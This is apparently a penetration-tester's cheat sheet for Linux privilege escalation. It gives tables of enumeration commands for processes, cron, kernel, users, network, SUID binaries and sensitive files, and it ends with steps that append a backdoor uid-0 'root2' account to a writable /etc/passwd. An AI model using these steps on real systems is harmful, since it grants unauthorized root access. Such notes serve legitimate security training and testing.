# Enumerating Attack Vectors

## **Helpful Tools**

1. [https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
2. [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
3. [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)
4. [https://pentestmonkey.net/tools/audit/unix-privesc-check](https://pentestmonkey.net/tools/audit/unix-privesc-check)

***

## **Processes and Jobs**

| Command                       | Description                                                                  |
| ----------------------------- | ---------------------------------------------------------------------------- |
|  `ps aux \| grep root`        | See processes running as root                                                |
| `./pspy64 -pf -i 1000`        | View running processes with `pspy`                                           |
| `ls -la /etc/cron.daily`      | Check for daily Cron jobs                                                    |
| `grep "CRON" /var/log/syslog` | Enumerate cron jobs                                                          |
| `lpstat`                      | Look for active or queued print jobs to gain access to sensitive information |

## **Kernel and OS**

| Command                | Description                                                  |
| ---------------------- | ------------------------------------------------------------ |
| `hostname`             | Check the hostname (useful to ensure the target is in scope) |
| `uname -a`             | Check the Kernel version                                     |
| `cat /proc/version`    | Check the Kernel version                                     |
| `cat /etc/lsb-release` | Check the OS version                                         |
| `cat /etc/os-release`  | Check the OS version                                         |
| `cat /etc/issue`       | May contain information about the system version and release |
| `lscpu`                | Gather additional information about the host                 |
| `sudo -V`              | Check sudo version                                           |

## **User-Related**

| Command      | Description                                     |
| ------------ | ----------------------------------------------- |
| `echo $PATH` | Check the current user's PATH variable contents |
| `ps au`      | See logged in users                             |
| `history`    | Check the current user's Bash history           |
| `whoami`     | Check what user we are running as               |
| `id`         | Check what groups we belong to                  |
| `sudo -l`    | Can the user run anything as another user?      |

## **Network Related**

| Command                | Description                                                                                                    |
| ---------------------- | -------------------------------------------------------------------------------------------------------------- |
| `ip -a`                | Check network interfaces                                                                                       |
| `ipconfig`             | Check network interfaces                                                                                       |
| `hostname -I`          | Display all IP addresses related to the host                                                                   |
| `cat /etc/hosts`       | Check for potential interesting hosts                                                                          |
| `route`                | Check out the routing table to see what other networks are available via which interface                       |
| `netstat -rn`          | Check out the routing table to see what other networks are available via which interface                       |
| `arp -a`               | Check the arp table to see what other hosts the target has been communicating with                             |
| `cat /etc/resolv.conf` | Check if the host is configured to use internal DNS → Starting point to query the Active Directory environment |
| `ss -tulpn`            | Check listening services on both TCP and UDP ports                                                             |
| `netstat -tulpn`       | Check listening services on both TCP and UDP ports                                                             |
| `ss -anp`              | Display active connections and listening ports                                                                 |

## **Finding Interesting Files and Directories**

<table><thead><tr><th width="466">Command</th><th>Description</th></tr></thead><tbody><tr><td><code>find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null</code></td><td>Find all accessible history files</td></tr><tr><td><code>find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null</code></td><td>Find world-writeable directories</td></tr><tr><td><code>find / -type d -name ".*" -ls 2>/dev/null</code></td><td>Find all hidden directories</td></tr><tr><td><code>find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null</code></td><td>Find all hidden files</td></tr><tr><td><code>find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null</code></td><td>Find world-writeable files</td></tr><tr><td><code>find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null</code></td><td>Find binaries with SUID bit set</td></tr><tr><td><code>find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null</code></td><td>Find binaries with SGID bit set</td></tr><tr><td><code>find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;</code></td><td>Enumerate binary files capabilities</td></tr><tr><td><code>find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null</code></td><td>Search config files</td></tr><tr><td><code>find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null</code></td><td>Search config files</td></tr><tr><td><code>find / -type f -name "*.sh" 2>/dev/null \| grep -v "src\|snap\|share"</code></td><td>Find <code>.sh</code> scripts</td></tr><tr><td><code>grep -r "word" /starting-path</code></td><td>Resursively inspect file contents to find instances of "word":</td></tr><tr><td><code>ls -l /tmp /var/tmp /dev/shm</code></td><td>Find temporary files</td></tr></tbody></table>

## Enumerating SUID binaries

**SUID** is a special file permission for executable files which enables other users to run the file with effective permissions of the file owner. Instead of the normal `x` which represents execute permissions, you will see an `s` (to indicate **SUID**) special permission for the user.

Obviously, for a quick win, you want to find SUID binaries having the `root` user as the file's owner.

HackTricks has a [page](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/euid-ruid-suid) where more info about this topic is explained.

You can `find` SUID binaries in many ways, the following are some example commands:

* `find / -perm -4000 2>/dev/null`
* `find / -perm /4000 2>/dev/null`
* `find / -perm /u+s 2>/dev/null`
* `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`

## Other Tricks - Miscellaneous

{% hint style="success" %}
This section contains some specific things which could help you find unusual vectors to escalate your privileges.
{% endhint %}

***

### Writeable passwd file

Always check whether you have write permissions into the `/etc/passwd` file.

If that's the case, you can effectively set an arbitrary password for any account.

To check, use `ls -la /etc/passwd`

Supposing you have write permissions, you can `generate a password hash` and use it to log as `root` as follows:

1. Generate the password hash:\
   `openssl passwd w00t output: Fdzt.eqJQ4s0g`
2. Append the password hash inside the passwd file:\
   `echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd`
3. Now you can login as root using `su root2` and inserting `w00t` as the user's password

